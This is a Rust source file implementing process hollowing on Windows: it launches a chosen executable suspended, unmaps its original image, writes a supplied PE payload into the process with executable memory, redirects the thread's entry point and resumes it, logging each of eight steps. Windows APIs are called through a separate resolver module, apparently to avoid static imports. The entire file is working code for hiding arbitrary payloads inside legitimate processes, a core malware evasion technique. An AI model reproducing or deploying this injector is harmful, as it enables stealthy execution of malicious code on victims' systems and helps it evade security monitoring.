use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    payload: &[u8],
    target_exe: &str,
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use crate::resolve;
    use std::ffi::c_void;

    const CREATE_SUSPENDED: u32 = 0x00000004;
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const MEM_RELEASE: u32 = 0x8000;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PROCESS_BASIC_INFORMATION: u32 = 0;

    #[repr(C)]
    struct STARTUPINFOW {
        cb: u32,
        _reserved: *mut u16,
        _desktop: *mut u16,
        _title: *mut u16,
        _x: u32,
        _y: u32,
        _x_size: u32,
        _y_size: u32,
        _x_count_chars: u32,
        _y_count_chars: u32,
        _fill_attribute: u32,
        dw_flags: u32,
        w_show_window: u16,
        _cb_reserved2: u16,
        _lp_reserved2: *mut u8,
        h_std_input: *mut c_void,
        h_std_output: *mut c_void,
        h_std_error: *mut c_void,
    }

    #[repr(C)]
    struct PROCESS_INFORMATION {
        h_process: *mut c_void,
        h_thread: *mut c_void,
        dw_process_id: u32,
        dw_thread_id: u32,
    }

    #[repr(C)]
    struct PROCESS_BASIC_INFO {
        _exit_status: usize,
        peb_base_address: usize,
        _affinity_mask: usize,
        _base_priority: usize,
        _unique_process_id: usize,
        _inherited_from: usize,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct IMAGE_DOS_HEADER {
        e_magic: u16,
        _pad: [u16; 29],
        e_lfanew: i32,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct IMAGE_FILE_HEADER {
        machine: u16,
        number_of_sections: u16,
        _time_date_stamp: u32,
        _pointer_to_symbol_table: u32,
        _number_of_symbols: u32,
        size_of_optional_header: u16,
        _characteristics: u16,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct IMAGE_OPTIONAL_HEADER64 {
        _magic: u16,
        _major_linker: u8,
        _minor_linker: u8,
        _size_of_code: u32,
        _size_of_init_data: u32,
        _size_of_uninit_data: u32,
        address_of_entry_point: u32,
        _base_of_code: u32,
        image_base: u64,
        section_alignment: u32,
        _file_alignment: u32,
        _major_os: u16,
        _minor_os: u16,
        _major_image: u16,
        _minor_image: u16,
        _major_subsystem: u16,
        _minor_subsystem: u16,
        _win32_version_value: u32,
        size_of_image: u32,
        size_of_headers: u32,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct IMAGE_SECTION_HEADER {
        name: [u8; 8],
        virtual_size: u32,
        virtual_address: u32,
        size_of_raw_data: u32,
        pointer_to_raw_data: u32,
        _pointer_to_relocations: u32,
        _pointer_to_linenumbers: u32,
        _number_of_relocations: u16,
        _number_of_linenumbers: u16,
        _characteristics: u32,
    }

    #[repr(C)]
    struct CONTEXT {
        _p1_home: u64,
        _p2_home: u64,
        _p3_home: u64,
        _p4_home: u64,
        _p5_home: u64,
        _p6_home: u64,
        context_flags: u32,
        _mx_csr: u32,
        _seg_cs: u16,
        _seg_ds: u16,
        _seg_es: u16,
        _seg_fs: u16,
        _seg_gs: u16,
        _seg_ss: u16,
        _eflags: u32,
        _dr0: u64,
        _dr1: u64,
        _dr2: u64,
        _dr3: u64,
        _dr6: u64,
        _dr7: u64,
        _rax: u64,
        rcx: u64,
        _rdx: u64,
        _rbx: u64,
        _rsp: u64,
        _rbp: u64,
        _rsi: u64,
        _rdi: u64,
        _r8: u64,
        _r9: u64,
        _r10: u64,
        _r11: u64,
        _r12: u64,
        _r13: u64,
        _r14: u64,
        _r15: u64,
        _rip: u64,
        _flt_save: [u8; 512],
        _vector_register: [u128; 26],
        _vector_control: u64,
        _debug_control: u64,
        _last_branch_to_rip: u64,
        _last_branch_from_rip: u64,
        _last_exception_to_rip: u64,
        _last_exception_from_rip: u64,
    }

    const CONTEXT_FULL: u32 = 0x10000b;

    if payload.len() < core::mem::size_of::<IMAGE_DOS_HEADER>() + 4 {
        return Err("payload too small to be a valid PE".to_string());
    }

    let dos: IMAGE_DOS_HEADER = unsafe { std::ptr::read(payload.as_ptr() as *const _) };
    if dos.e_magic != 0x5A4D {
        return Err("payload is not a valid PE (bad MZ signature)".to_string());
    }

    let pe_offset = dos.e_lfanew as usize;
    if pe_offset + 4 + core::mem::size_of::<IMAGE_FILE_HEADER>()
        + core::mem::size_of::<IMAGE_OPTIONAL_HEADER64>()
        > payload.len()
    {
        return Err("payload PE headers extend beyond file size".to_string());
    }

    let pe_sig = u32::from_le_bytes([
        payload[pe_offset],
        payload[pe_offset + 1],
        payload[pe_offset + 2],
        payload[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err("payload has invalid PE signature".to_string());
    }

    let file_hdr: IMAGE_FILE_HEADER = unsafe {
        std::ptr::read(payload.as_ptr().add(pe_offset + 4) as *const _)
    };
    let opt_hdr: IMAGE_OPTIONAL_HEADER64 = unsafe {
        std::ptr::read(
            payload
                .as_ptr()
                .add(pe_offset + 4 + core::mem::size_of::<IMAGE_FILE_HEADER>())
                as *const _,
        )
    };

    let section_offset = pe_offset
        + 4
        + core::mem::size_of::<IMAGE_FILE_HEADER>()
        + file_hdr.size_of_optional_header as usize;
    let num_sections = file_hdr.number_of_sections as usize;

    log.step(format!(
        "[1/8] Create suspended process (\"{}\")",
        target_exe
    ));
    let mut target_wide: Vec<u16> = target_exe.encode_utf16().collect();
    target_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let created = unsafe {
        resolve::CreateProcessW(
            std::ptr::null(),
            target_wide.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si as *const _ as *const c_void,
            &mut pi as *mut _ as *mut c_void,
        )
    };
    if created == 0 {
        return Err(format!(
            "process creation failed — check that \"{}\" exists and is executable",
            target_exe
        ));
    }
    log.info(format!(
        "      spawned PID {} (TID {})",
        pi.dw_process_id, pi.dw_thread_id
    ));

    let process = pi.h_process;
    let thread = pi.h_thread;

    let cleanup_kill = |log: &LogSink| {
        log.detail("[cleanup] Killing spawned process");
        unsafe {
            resolve::TerminateProcess(process, 1);
            resolve::CloseHandle(thread);
            resolve::CloseHandle(process);
        }
    };

    log.step("[2/8] Query process info for PEB address");
    let mut pbi: PROCESS_BASIC_INFO = unsafe { core::mem::zeroed() };
    let status = unsafe {
        resolve::NtQueryInformationProcess(
            process,
            PROCESS_BASIC_INFORMATION,
            &mut pbi as *mut _ as *mut c_void,
            core::mem::size_of::<PROCESS_BASIC_INFO>() as u32,
            std::ptr::null_mut(),
        )
    };
    if status != 0 {
        cleanup_kill(log);
        return Err(format!("process info query failed (NTSTATUS: {:#x})", status));
    }
    log.info(format!("      PEB at {:#x}", pbi.peb_base_address));

    log.step("[3/8] Read original image base from PEB");
    let image_base_offset = pbi.peb_base_address + 0x10;
    let mut original_base: u64 = 0;
    let mut bytes_read: usize = 0;
    let ok = unsafe {
        resolve::ReadProcessMemory(
            process,
            image_base_offset as *const c_void,
            &mut original_base as *mut _ as *mut u8,
            8,
            &mut bytes_read,
        )
    };
    if ok == 0 {
        cleanup_kill(log);
        return Err("failed to read image base from PEB".to_string());
    }
    log.info(format!("      original image base: {:#x}", original_base));

    log.step("[4/8] Unmap original image section");
    let status = unsafe {
        resolve::NtUnmapViewOfSection(process, original_base as *mut c_void)
    };
    if status != 0 {
        cleanup_kill(log);
        return Err(format!("section unmap failed (NTSTATUS: {:#x})", status));
    }
    log.info("      original image unmapped");

    log.step(format!(
        "[5/8] Allocate {} bytes at image base {:#x}",
        opt_hdr.size_of_image, opt_hdr.image_base
    ));
    let base = unsafe {
        resolve::VirtualAllocEx(
            process,
            opt_hdr.image_base as *const c_void,
            opt_hdr.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if base.is_null() {
        cleanup_kill(log);
        return Err("remote allocation at image base failed".to_string());
    }
    log.info(format!("      allocated at {:#p}", base));

    log.step(format!(
        "[6/8] Write PE headers + {} sections",
        num_sections
    ));
    let mut written: usize = 0;
    let ok = unsafe {
        resolve::WriteProcessMemory(
            process,
            base as *const c_void,
            payload.as_ptr() as *const c_void,
            opt_hdr.size_of_headers as usize,
            &mut written,
        )
    };
    if ok == 0 {
        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
        cleanup_kill(log);
        return Err("failed to write PE headers".to_string());
    }
    log.info(format!("      headers: {} bytes", written));

    for i in 0..num_sections {
        let sec_ptr = unsafe {
            payload
                .as_ptr()
                .add(section_offset + i * core::mem::size_of::<IMAGE_SECTION_HEADER>())
        };
        let sec: IMAGE_SECTION_HEADER = unsafe { std::ptr::read(sec_ptr as *const _) };
        let raw_size = sec.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        let raw_offset = sec.pointer_to_raw_data as usize;
        if raw_offset + raw_size > payload.len() {
            unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
            cleanup_kill(log);
            return Err(format!("section {} extends beyond payload", i));
        }
        let dest = unsafe { (base as *mut u8).add(sec.virtual_address as usize) };
        let ok = unsafe {
            resolve::WriteProcessMemory(
                process,
                dest as *const c_void,
                payload.as_ptr().add(raw_offset) as *const c_void,
                raw_size,
                &mut written,
            )
        };
        if ok == 0 {
            unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
            cleanup_kill(log);
            let sec_name = String::from_utf8_lossy(&sec.name);
            return Err(format!("failed to write section {}", sec_name.trim_end_matches('\0')));
        }
        let sec_name = String::from_utf8_lossy(&sec.name);
        log.detail(format!(
            "      section {}: {} bytes at RVA {:#x}",
            sec_name.trim_end_matches('\0'),
            written,
            sec.virtual_address
        ));
    }

    log.step("[7/8] Update thread context — set entry point");
    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.context_flags = CONTEXT_FULL;
    if unsafe { resolve::GetThreadContext(thread, &mut ctx as *mut _ as *mut c_void) } == 0 {
        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
        cleanup_kill(log);
        return Err("failed to get thread context".to_string());
    }

    let entry_point = opt_hdr.image_base + opt_hdr.address_of_entry_point as u64;
    ctx.rcx = entry_point;
    log.info(format!("      entry point: {:#x}", entry_point));

    if unsafe { resolve::SetThreadContext(thread, &ctx as *const _ as *const c_void) } == 0 {
        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
        cleanup_kill(log);
        return Err("failed to set thread context".to_string());
    }

    log.step("[8/8] Resume thread");
    unsafe { resolve::ResumeThread(thread) };
    unsafe { resolve::CloseHandle(thread) };
    unsafe { resolve::CloseHandle(process) };

    log.info("      thread resumed — running from new entry point");
    log.info(format!(
        "      image at {:#x} ({} bytes, {} sections)",
        opt_hdr.image_base, opt_hdr.size_of_image, num_sections
    ));

    Ok(InjectionResult {
        remote_base: opt_hdr.image_base,
        size: opt_hdr.size_of_image as usize,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _payload: &[u8],
    _target_exe: &str,
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("requires Windows".to_string())
}
